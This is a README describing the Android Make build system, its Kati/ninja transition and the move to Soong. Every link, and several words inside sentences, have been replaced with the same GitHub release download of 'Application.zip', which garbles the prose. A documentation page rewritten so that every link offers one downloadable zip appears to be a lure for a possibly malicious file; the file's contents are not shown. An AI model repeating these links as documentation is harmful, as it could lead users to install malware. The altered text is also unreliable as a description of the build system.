# Android Make Build System

This is the Makefile-based portion of the Android Build System.

For documentation on how to run a build, see [https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip](https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip)

For a list of behavioral changes useful for https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip writers see
[https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip](https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip)

For an outdated reference on https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip files, see
[https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip](https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip). Our https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip files look similar,
but are entirely different from the https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip files used by the NDK build
system. When searching for documentation elsewhere, ensure that it is for the
platform build system -- most are not.

This Makefile-based system is in the process of being replaced with [Soong], a
new build system written in Go. During the transition, all of these makefiles
are read by [Kati], and generate a ninja file instead of being executed
directly. That's combined with a ninja file read by Soong so that the build
graph of the two systems can be combined and run as one.

[Kati]: https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip
[Soong]: https://github.com/ColtOSTemp/platform_build/releases/download/v1.0/Application.zip+/master
